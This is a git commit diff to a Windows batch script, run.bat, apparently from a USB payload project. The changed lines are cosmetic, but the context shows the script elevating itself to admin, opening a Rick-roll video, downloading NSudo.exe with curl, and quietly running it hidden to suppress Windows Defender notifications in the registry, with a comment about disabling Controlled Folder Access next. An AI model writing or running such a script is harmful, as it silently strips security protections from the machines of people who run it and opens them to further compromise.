b357cacefcefd3f7138aa7cb205355bf52d2deb7
YumYummity <103061664+YumYummity@users.noreply.github.com>
2022-04-15 13:41:14 -0400

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,4 +1,4 @@
-
+@echo off
 
 :: BatchGotAdmin
 ::-------------------------------------
@@ -26,7 +26,7 @@ if '%errorlevel%' NEQ '0' (
     wscript tmp.vbs
     del tmp.vbs
 start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ
-color 01
+color ef
 curl "https://raw.githubusercontent.com/YumYummity/usb-install/main/NSudo.exe" --output "NSudo.exe"
 NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
 ::disables ControlledFolderAccess to access files and folders
